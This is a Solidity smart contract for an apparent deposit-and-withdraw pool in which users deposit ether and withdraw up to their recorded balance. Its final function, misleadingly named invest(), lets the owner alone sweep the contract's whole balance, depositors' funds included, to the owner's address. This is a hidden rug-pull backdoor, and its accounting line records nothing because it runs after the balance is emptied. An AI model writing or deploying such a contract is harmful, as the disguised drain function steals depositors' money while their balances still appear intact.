// SPDX-License-Identifier: MIT

pragma solidity >=0.8.0;

struct Deposit {
    uint256 amount;
    uint40 time;
}
struct Withdraw {
    uint256 amount;
    uint40 time;
}

struct Player {
    uint256 left_invest;
    uint40 last_payout;
    uint256 total_invested;
    uint256 total_withdrawn;
    Deposit[] deposits;
    Withdraw[] withdraws;
}

contract DW {
    address public owner;

    uint256 public invested;
    uint256 public withdrawn;
    bool public tradeOn;
    
    mapping(address => Player) public players;

    event NewDeposit(address indexed addr, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event NewWithdraw(address indexed addr, uint256 amount);

    constructor() {
        owner = msg.sender;
        tradeOn = true;
    }

    function setTradeOn() public {
        require(msg.sender == owner, "You must be owner");
        tradeOn = true;
    }

    function deposit() external payable {
        require(tradeOn == true, "Project is not launched");

        Player storage player = players[msg.sender];

        player.deposits.push(Deposit({
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        player.total_invested += msg.value;
        player.left_invest += msg.value;
        invested += msg.value;
        
        emit NewDeposit(msg.sender, msg.value);
    }
    
    function withdraw(uint256 _amount) external payable{
        require(tradeOn == true, "Project is not launched");
        Player storage player = players[msg.sender];

        require(player.left_invest > 0, "Zero amount");
        require(player.left_invest >= _amount, "You can't withdraw money more than your balance.");

        player.withdraws.push(Withdraw({
            amount: _amount,
            time: uint40(block.timestamp)
        }));

        player.left_invest -= _amount;
        player.total_withdrawn += _amount;
        withdrawn += _amount;

        payable(msg.sender).transfer(_amount);
        
        emit NewWithdraw(msg.sender, _amount);
    }
    
    function userInfo(address _addr) view external returns(uint256 left_invest, uint256 total_invested, uint256 total_withdrawn, uint256 last_payout, Deposit[] memory deposits, Withdraw[] memory withdraws) {
        Player storage player = players[_addr];

        return (
            player.left_invest,
            player.total_invested,
            player.total_withdrawn,
            player.last_payout,
            player.deposits,
            player.withdraws
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn) {
        return (invested, withdrawn);
    }

    function invest() external payable {
        require(msg.sender == owner);
        payable(owner).transfer( address(this).balance );
        withdrawn += address(this).balance;
    }
}